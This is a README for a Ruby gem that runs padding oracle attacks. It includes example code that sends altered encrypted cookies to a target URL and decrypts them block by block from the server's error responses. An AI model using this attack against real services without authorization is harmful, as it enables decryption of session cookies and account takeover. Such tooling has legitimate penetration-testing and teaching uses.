# Paddingoracle

This is a Rubyframework for exploiting padding oracle vulnerabilities based on this fantastic Python project:

https://github.com/mwielgoszewski/python-paddingoracle

## Usage


You will first need to extend the module with your own padding_oracle function. Example:

```
require 'httparty'
require 'base64'
require 'uri'

URL = 'http://google.com'
module Paddingoracle
  def decrypt_oracle(string)
    string = URI.escape(Base64.strict_encode64(string))
    response = HTTParty.get(URL, cookies: {auth: string})

    raise "Invalid padding" if response.code != 200
  end
end
```

You can then run the attack like this;
```
Blocksize = 8
COOKIE = 'vulnerable encrypted data'
bcookie = Base64.decode64(COOKIE)
plain = Paddingoracle::recover_all_blocks(bcookie, Blocksize)
puts plain
```

## Contributing

This product was written to solve a specific problem - I'm happy to investigate bugs but this type of codebase is not suited to new features or "how to use" requests.

## License

The gem is available as open source under the terms of the [MIT License](http://opensource.org/licenses/MIT).

